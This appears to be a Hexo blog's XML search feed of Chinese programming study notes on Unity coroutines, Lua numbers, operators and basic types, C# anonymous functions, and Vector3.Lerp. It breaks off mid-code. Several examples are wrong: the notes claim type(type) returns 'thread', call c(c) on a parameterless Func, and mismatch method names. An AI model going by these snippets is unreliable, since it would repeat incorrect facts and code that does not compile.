<h3 id="5、yield-return-不同内容的含义"><a href="#5、yield-return-不同内容的含义" class="headerlink" title="5、yield return 不同内容的含义"></a>5、yield return 不同内容的含义</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.下一帧执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> <span class="keyword">return</span> 数字;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在Update和LateUpdate之间执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.等待指定秒后执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForSeconds</span>(<span class="params">秒</span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在Update和LateUpdate之间执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.等待下一个固定物理帧更新时执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForFixedUpdate</span>(<span class="params"></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在FixedUpdate和碰撞检测相关函数之后执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//4.等待摄像机和GUI渲染完成后执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">yield</span> return new <span class="title">WaitForEndOfFrame</span>(<span class="params"></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//在LateUpdate之后的渲染相关处理完毕后之后</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//5.一些特殊类型的对象 比如异步加载相关函数返回的对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//之后讲解 异步加载资源 异步加载场景 网络加载时再讲解</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//一般在Update和LateUpdate之间执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//6.跳出协程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> <span class="keyword">break</span>;</span></pre></td></tr></table></figure>

<h4 id="6、协程受对象和组件失活销毁的影响"><a href="#6、协程受对象和组件失活销毁的影响" class="headerlink" title="6、协程受对象和组件失活销毁的影响"></a>6、协程受对象和组件失活销毁的影响</h4><p>协程开启后<br>组件和物体销毁，协程不执行<br>物体失活协程不执行，组件失活协程执行</p>
<h4 id="7、总结"><a href="#7、总结" class="headerlink" title="7、总结"></a>7、总结</h4><p>1.Unity支持多线程，只是新开线程无法访问主线程中Unity相关内容<br> 一般主要用于进行复杂逻辑运算或者网络消息接收等等<br>注意：Unity中的多线程一定记住关闭<br>2.协同程序不是多线程，它是将线程中逻辑进行分时执行，避免卡顿<br>3.继承MonoBehavior的类都可以使用协程<br>4.开启协程方法、关闭协程方法<br>5.yield return 返回的内容对于我们的意义<br>6.协程只有当组件单独失活时不受影响，其它情况协程会停止</p>
]]></content>
  </entry>
  <entry>
    <title>lua学习笔记(二）</title>
    <url>/2021/03/27/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<center>Lua5.3开始，Lua语言为数值格式提供了两种选择：被称为integer的64位整型和被称为float的双精度浮点类型。</center>

<a id="more"></a>

<h2 id="3-数值"><a href="#3-数值" class="headerlink" title="3.数值"></a>3.数值</h2><h3 id="3-1数值常量"><a href="#3-1数值常量" class="headerlink" title="3.1数值常量"></a>3.1数值常量</h3><p>具有十进制小数或者指数的数值会被当做浮点型值，否则会被当做整型值。</p>
<p>整型值和浮点型值的类型都是”number”</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="number">3</span>)     <span class="comment">--&gt; number</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="number">3.5</span>)   <span class="comment">--&gt; number</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="number">3.0</span>)   <span class="comment">--&gt; number</span></span></pre></td></tr></table></figure>

<p>由于整型值和浮点型值的类型都是”number”，所以它们是可以相互转换的。具有相同算数值的整型值和浮点型值在Lua语言中是相等的：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">1</span> == <span class="number">1.0</span>      <span class="comment">--&gt; true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">-3</span> == <span class="number">-3.0</span>    <span class="comment">--&gt; true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">0.2e3</span> == <span class="number">200</span>  <span class="comment">--&gt; true</span></span></pre></td></tr></table></figure>

<p>需要区分整型值和浮点型值时，可以用函数math.type:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="number">3</span>)   <span class="comment">--&gt; integer</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.<span class="built_in">type</span>(<span class="number">3.0</span>) <span class="comment">--&gt; float</span></span></pre></td></tr></table></figure>

<h3 id="3-2算术运算"><a href="#3-2算术运算" class="headerlink" title="3.2算术运算"></a>3.2算术运算</h3><p>如果两个操作数都是整型，那么结果也是整型，否则，结果就是浮点型</p>
<p>注：<font color="red">除法运算操作的永远是浮点数且产生浮点型值的结果</font></p>
<p>x-x%0.01恰好是x保留两位小数的结果，x-x%0.001恰好是x保留三位小数的结果</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;x = <span class="built_in">math</span>.<span class="built_in">pi</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">x - x%<span class="number">0.01</span>  <span class="comment">--&gt; 3.14</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">x - x%<span class="number">0.001</span> <span class="comment">--&gt; 3.141</span></span></pre></td></tr></table></figure>

<p>像除法一样，幂运算的操作数也永远是浮点类型</p>
<h3 id="3-3运算关系"><a href="#3-3运算关系" class="headerlink" title="3.3运算关系"></a>3.3运算关系</h3><p>&lt;    &gt;     &lt;=     &gt;=    ==     ~=</p>
<p>==  和 ~=这两个运算符可以应用于任意两个值，当这两个值的类型不同时,Lua语言认为它们是不相等的；否则，会根据它们的类型再对两者进行比较。</p>
<h3 id="3-4随机数发生器"><a href="#3-4随机数发生器" class="headerlink" title="3.4随机数发生器"></a>3.4随机数发生器</h3><p>函数math.random用于生成伪随机数，共有三种调用方式。</p>
<p>1、当不带参数调用时，该函数将返回一个在[0,1)范围内均匀分布的伪随机实数。</p>
<p>2、当使用带有一个整型值n的参数调用时，该函数将返回一个在[1,n]范围内的伪随机整数。</p>
<p>3、当使用带有两个整型值l和u的参数调用时,该函数返回在[l,u]范围内的伪随机整数。</p>
<h3 id="3-5表示范围"><a href="#3-5表示范围" class="headerlink" title="3.5表示范围"></a>3.5表示范围</h3><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.maxinteger     <span class="comment">--&gt;  9223372036854775807</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.mininteger     <span class="comment">--&gt;  -9223372036854775808</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.maxinteger + <span class="number">1</span> == <span class="built_in">math</span>.mininteger    <span class="comment">--&gt;  true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.mininteger - <span class="number">1</span> == <span class="built_in">math</span>.maxinteger    <span class="comment">--&gt;  true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.maxinteger + <span class="built_in">math</span>.mininteger == <span class="number">-1</span>   <span class="comment">--&gt;  true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;-<span class="built_in">math</span>.mininteger == <span class="built_in">math</span>.mininteger       <span class="comment">--&gt;  true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">math</span>.mininteger // <span class="number">-1</span> == <span class="built_in">math</span>.mininteger  <span class="comment">--&gt;  true</span></span></pre></td></tr></table></figure>

<h3 id="3-6惯例"><a href="#3-6惯例" class="headerlink" title="3.6惯例"></a>3.6惯例</h3><p>小于2^53(即9007199254740992)的所有整型值的表示与双精度浮点值的表示一样，对于绝对值超过了这个值的整型值而言，在将其强制转换位浮点型值时可能导致精度损失。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">9007199254740991</span> + <span class="number">0.0</span> == <span class="number">9007199254740991</span>   <span class="comment">--&gt;true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">9007199254740992</span> + <span class="number">0.0</span> == <span class="number">9007199254740992</span>   <span class="comment">--&gt;true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">9007199254740993</span> + <span class="number">0.0</span> == <span class="number">9007199254740993</span>   <span class="comment">--&gt;false</span></span></pre></td></tr></table></figure>

<p>2^53+1的结果被取整为2^53，打破了等式,表达式结果为false</p>
<h3 id="3-7运算符优先级"><a href="#3-7运算符优先级" class="headerlink" title="3.7运算符优先级"></a>3.7运算符优先级</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^</span></pre></td></tr><tr><td class="code"><pre><span class="line">~	#	~	not</span></pre></td></tr><tr><td class="code"><pre><span class="line">*	&#x2F;	&#x2F;&#x2F;	%</span></pre></td></tr><tr><td class="code"><pre><span class="line">+	-</span></pre></td></tr><tr><td class="code"><pre><span class="line">..</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&lt;	&gt;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&amp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">~</span></pre></td></tr><tr><td class="code"><pre><span class="line">|</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;	&gt;	&lt;&#x3D;	&gt;&#x3D;	~&#x3D;	&#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">and</span></pre></td></tr><tr><td class="code"><pre><span class="line">or</span></pre></td></tr></table></figure>

<p>注：<font color="red">幂运算和连接操作符是有结合的</font></p>
]]></content>
  </entry>
  <entry>
    <title>Csharp匿名函数</title>
    <url>/2021/04/11/Csharp%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<center>匿名函数</center>

<a id="more"></a>

<h3 id="1-什么是匿名函数？"><a href="#1-什么是匿名函数？" class="headerlink" title="1.什么是匿名函数？"></a>1.什么是匿名函数？</h3><p>顾名思义，就是没有名字的函数<br>匿名函数的使用主要是配合委托和事件进行使用<br>脱离委托和事件 是不会使用匿名函数的</p>
<h3 id="2-基本语法"><a href="#2-基本语法" class="headerlink" title="2.基本语法"></a>2.基本语法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delegate</span>(参数列表)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//函数逻辑</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr></table></figure>

<p>何时使用？</p>
<p>1.函数中传递委托参数时</p>
<p>2.委托或事件赋值时</p>
<h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h3><p>1.无参无返回<br>这样申明匿名函数 只是在申明函数而已 还没有调用<br>真正调用它的时候 是这个委托容器啥时候调用 就什么时候调用这个匿名函数</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action a = <span class="keyword">delegate</span>()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"匿名函数逻辑"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">a();</span></pre></td></tr></table></figure>

<p>2.有参</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action&lt;<span class="keyword">int</span>, <span class="keyword">string</span>&gt; b = <span class="keyword">delegate</span>(<span class="keyword">int</span> a, <span class="keyword">string</span> b)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(a);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(b);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">b(<span class="number">100</span>,<span class="string">"123"</span>);</span></pre></td></tr></table></figure>

<p>3.有返回值</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">string</span>&gt; c = <span class="keyword">delegate</span>()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="string">"123123"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(c(c));</span></pre></td></tr></table></figure>

<p>4.一般情况会作为函数参数传递 或者 作为函数返回值</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Test</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> Action action;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//作为参数传递时</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dosomthing</span>(<span class="params"><span class="keyword">int</span> a, Action fun</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(a);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	fun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//作为返回值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> Action <span class="title">GetFun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="keyword">delegate</span>() &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"函数内部返回的一个匿名函数逻辑"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestTTTT</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Test t = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="code"><pre><span class="line">Action ac = <span class="keyword">delegate</span>()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(<span class="string">"随参数传入的匿名函数逻辑"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">t.DoSomething(<span class="number">50</span>, ac);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数传递</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">t.Dosomething(<span class="number">100</span>, <span class="keyword">delegate</span>()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"随参数传入的匿名函数逻辑"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;);</span></pre></td></tr></table></figure>

<p>5.将委托作为返回值类型</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">GetFun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="keyword">delegate</span>() &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"函数内部返回的一个匿名函数逻辑"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Action ac2 = t.GetFun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">ac2();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//一步到位 直接调用返回的 委托函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">t.GetFun()();</span></pre></td></tr></table></figure>

<h3 id="4-匿名函数的缺点"><a href="#4-匿名函数的缺点" class="headerlink" title="4.匿名函数的缺点"></a>4.匿名函数的缺点</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action ac3 = <span class="keyword">delegate</span> ()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">"匿名函数一"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ac3 += <span class="keyword">delegate</span> ()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">"匿名函数二"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ac3();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//因为匿名函数没有名字 所以没有办法指定移除某一个匿名函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//此匿名函数 非彼匿名函数 不能通过看逻辑是否一样 就证明是一个 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//ac3 -= delegate ()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//&#123;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//    Console.WriteLine("匿名函数一");</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//&#125;;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ac3 = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//ac3();</span></span></pre></td></tr></table></figure>

<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><p>匿名函数 就是没有名字的函数<br>固定写法<br>delegate(参数列表){}<br>主要是在 委托传递和存储时  为了方便可以直接使用倪敏该函数<br>缺点是 没有办法指定移除</p>
]]></content>
  </entry>
  <entry>
    <title>lua学习笔记(一）</title>
    <url>/2021/03/27/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<center>最近在学习lua语言，在这里记录一下</center>

<a id="more"></a>

<h2 id="1、Lua语言入门"><a href="#1、Lua语言入门" class="headerlink" title="1、Lua语言入门"></a>1、Lua语言入门</h2><h3 id="1-1、Lua保留字"><a href="#1-1、Lua保留字" class="headerlink" title="1.1、Lua保留字"></a>1.1、Lua保留字</h3><table>
<thead>
<tr>
<th>保留字</th>
<th>保留字</th>
<th>保留字</th>
<th>保留字</th>
<th>保留字</th>
</tr>
</thead>
<tbody><tr>
<td>and</td>
<td>break</td>
<td>do</td>
<td>else</td>
<td>elseif</td>
</tr>
<tr>
<td>end</td>
<td>false</td>
<td>goto</td>
<td>for</td>
<td>function</td>
</tr>
<tr>
<td>if</td>
<td>in</td>
<td>local</td>
<td>nil</td>
<td>not</td>
</tr>
<tr>
<td>or</td>
<td>repeat</td>
<td>return</td>
<td>then</td>
<td>true</td>
</tr>
<tr>
<td>until</td>
<td>while</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="1-2、全局变量"><a href="#1-2、全局变量" class="headerlink" title="1.2、全局变量"></a>1.2、全局变量</h3><p>在Lua语言中，全局变量无须声明便可使用，使用未初始化的全局变量也不会报错，默认为nil</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;b         <span class="comment">--&gt;nil</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;b = <span class="number">10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;b         <span class="comment">--&gt;10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;b = <span class="literal">nil</span>   <span class="comment">--&gt;nil</span></span></pre></td></tr></table></figure>

<p><font color="red">Lua语言不区分未初始化和被赋值为nil的变量，如果将nil赋值给全局变量，Lua语言会最终回收该变量占用的内存，也相当于将其删除</font></p>
<h3 id="1-3、类型与值"><a href="#1-3、类型与值" class="headerlink" title="1.3、类型与值"></a>1.3、类型与值</h3><p>Lua语言中有8种基本类型：</p>
<p>1、nil（空）</p>
<p>2、boolean（布尔）</p>
<p>3、number（数值）</p>
<p>4、string（字符串）</p>
<p>5、userdata（用户数据）</p>
<p>6、function（函数）</p>
<p>7、thread（线程）</p>
<p>8、table（表）</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="literal">nil</span>)               <span class="comment">--&gt;nil</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="literal">true</span>)              <span class="comment">--&gt;boolean</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;(<span class="number">125</span> * <span class="number">60</span>)              <span class="comment">--&gt;number</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;(<span class="string">"Hello world!"</span>)        <span class="comment">--&gt;string</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">io</span>.<span class="built_in">stdin</span>)          <span class="comment">--&gt;userdata</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">print</span>)             <span class="comment">--&gt;function</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">type</span>)              <span class="comment">--&gt;thread</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(&#123;&#125;)                <span class="comment">--&gt;table</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">type</span>(X))           <span class="comment">--&gt;string</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">type</span>(<span class="string">"gfd"</span>))       <span class="comment">--&gt;string</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">type</span>(<span class="built_in">type</span>(<span class="built_in">type</span>(X)))     <span class="comment">--&gt;string</span></span></pre></td></tr></table></figure>

<p>不管X是什么，type(type(X))始终返回”string“。这是因为函数type的返回值永远是一个字符串。</p>
<h4 id="1-3-1-Boolean"><a href="#1-3-1-Boolean" class="headerlink" title="1.3.1 Boolean"></a>1.3.1 Boolean</h4><p>在Lua语言中，条件测试将除Boolean值false和nil外的所有其他值视为真。</p>
<p>在条件检测中Lua语言把零和空字符也都视为真。</p>
<p>“false”代表的是所有为假的值，包括Boolean类型的<strong>false</strong>或nil,<strong>false</strong>特指Boolean类型的值。</p>
<p>Lua语言支持常见的逻辑运算符：<strong>and</strong>、<strong>or</strong>和<strong>not</strong></p>
<p>和条件测试一样，所有的逻辑运算将Boolean类型的false和nil当作假，而把其他值当作真</p>
<p><strong>and</strong>：如果第一个操作数为”false“则返回第一个操作数，否则返回第二个操作数。</p>
<p><strong>or</strong>：如果第一个操作数不为”false“则返回第一个操作数，否则返回第二个操作数。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="number">5</span>          <span class="comment">--&gt;5</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">6</span> <span class="keyword">and</span> <span class="number">4</span>          <span class="comment">--&gt;4</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="literal">nil</span> <span class="keyword">and</span> <span class="number">5</span>        <span class="comment">--&gt;nil</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="literal">false</span> <span class="keyword">and</span> <span class="number">8</span>      <span class="comment">--&gt;false</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="number">0</span> <span class="keyword">or</span> <span class="number">5</span>           <span class="comment">--&gt;0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="literal">false</span> <span class="keyword">or</span> <span class="string">"hi"</span>    <span class="comment">--&gt;"hi"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;<span class="literal">nil</span> <span class="keyword">or</span> <span class="literal">false</span>     <span class="comment">--&gt;false</span></span></pre></td></tr></table></figure>

<h3 id="1-4独立解释器"><a href="#1-4独立解释器" class="headerlink" title="1.4独立解释器"></a>1.4独立解释器</h3><p>编译器在运行代码前会创建一个名为arg的表,其中存储了所有的命令行参数</p>
<p>一般可使用arg[0]来获取自身脚本的名字</p>
]]></content>
  </entry>
  <entry>
    <title>插值向量</title>
    <url>/2021/05/16/%E6%8F%92%E5%80%BC%E5%90%91%E9%87%8F/</url>
    <content><![CDATA[<center>插值向量</center>

<p>记录了下Lerp的两种用法</p>
<a id="more"></a>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//变量声明</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Transform target;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Transform A;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Transform B;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Transform C;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Vector3 startPos;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">float</span> time;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Vector3 nowTarget;</span></pre></td></tr></table></figure>

<h4 id="1、线性插值"><a href="#1、线性插值" class="headerlink" title="1、线性插值"></a>1、线性插值</h4><p>1.先快后慢</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//每帧改变start位置 位置无限接近 但不会得到end位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">A.position = Vector3.Lerp(A.position, target.position, Time.deltaTime);</span></pre></td></tr></table></figure>

<p>2.匀速</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    startPos = B.position;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//每帧改变时间  当t&gt;=1时 得到结果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//这种匀速移动 当time&gt;=1时  我改变了 目标位置后  它会直接瞬移到我们的目标位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nowTarget != target.position)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        nowTarget = target.position;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        time = <span class="number">0</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        startPos = B.position;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    time += Time.deltaTime;</span></pre></td></tr><tr><td class="code"><pre><span 